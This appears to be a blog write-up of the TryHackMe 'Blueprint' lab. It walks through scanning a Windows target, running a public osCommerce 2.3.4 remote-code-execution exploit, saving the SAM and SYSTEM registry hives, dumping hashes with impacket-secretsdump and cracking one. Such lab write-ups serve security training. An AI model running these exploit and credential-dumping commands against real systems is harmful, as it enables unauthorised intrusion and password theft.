---
title: "Blueprint"
date: 2025-04-10
draft: false
summary: "Writeup for Blueprint CTF challenge on TryHackMe."
tags: ["windows", "cms", "rce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/blueprint/cover.webp"
  caption: "Blueprint TryHackMe Challenge"
  alt: "Blueprint cover"
platform: "TryHackMe"
---

Hack into this Windows machine and escalate your privileges to Administrator.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/blueprint

## Scanning

I performed an **nmap** aggressive scan on the target to find open ports and services running on them.

```shell
nmap -A -p- -Pn TARGET --min-rate 10000 -oN blueprint.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |
| 135      | rpc         |
| 139      | netbios     |
| 443      | https       |
| 445      | smb         |
| 3306     | mysql       |
| 8080     | http        |
| 49152    | rpc         |
| 49153    | rpc         |
| 49154    | rpc         |
| 49158    | rpc         |
| 49159    | rpc         |
| 49160    | rpc         |

![](https://cdn.ziomsec.com/blueprint/1.webp)
![](https://cdn.ziomsec.com/blueprint/2.webp)

![](https://cdn.ziomsec.com/blueprint/3.webp)

## Foothold

The web service running on port 80 did not have an index page. So, I received a 404 error when I accessed it. The service running on port 8080 revealed a directory listing for a CMS

![](https://cdn.ziomsec.com/blueprint/4.webp)

I searched for exploits related to **oscommerece-2.3.4** and found multiple payloads using `searchsploit`

```shell
searchsploit 'oscommerce 2.3.4'
```

![](https://cdn.ziomsec.com/blueprint/5.webp)

I then downloaded the seconds RCE exploit and ran it to get shell as NT Authority.

```shell
searchsploit -m php/webapps/50128.py
mv 50128.py exp2.py
python3 exp2.py http://TARGET:8080/oscommerece-2.3.4/catalog
```

![](https://cdn.ziomsec.com/blueprint/6.webp)

![](https://cdn.ziomsec.com/blueprint/7.webp)

I then captured the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\Administrator\Desktop\root.txt.txt
```

![](https://cdn.ziomsec.com/blueprint/8.webp)

Now that I had full control on the target, I downloaded the hashes from registry hives and extracted them on my system using **`impacket-secretsdump`**. To do that, I first saved a copy of the SAM and SYSTEM registry hives.

```shell
reg.exe save HKLM\SAM MySam
reg.exe save HKLM\SYSTEM MySys
```

> reference: https://security.stackexchange.com/questions/38518/how-to-get-an-nt-hash-from-registry

![](https://cdn.ziomsec.com/blueprint/9.webp)

Since the directory where I saved them was  being hosted by the web server, I downloaded these copies locally from the web application.

![](https://cdn.ziomsec.com/blueprint/10.webp)

Finally, I dumped the hashes

```shell
impacket-secretsdump -system MySys -sam MySam local
```

![](https://cdn.ziomsec.com/blueprint/11.webp)

I then cracked the hash of *Lab* using crackstation

![](https://cdn.ziomsec.com/blueprint/12.webp)

## Closure

Here's a short summary of how I pwned **Blueprint**:
- I discovered a CMS called oscommerce running on port 8080
- I found an RCE exploit for the cms version running on the target on exploit-db.
- I used that exploit to get a shell as NT Authority/System.
- I then captured the flag from *Administrator*'s Desktop.
- I downloaded a copy of SAM and SYSTEM hives locally and used `impacket-secretsdump` to dump hashes from them.
- Finally, I cracked *Lab*'s hash from crackstation.

That's it from my side!
Until next time :)

---
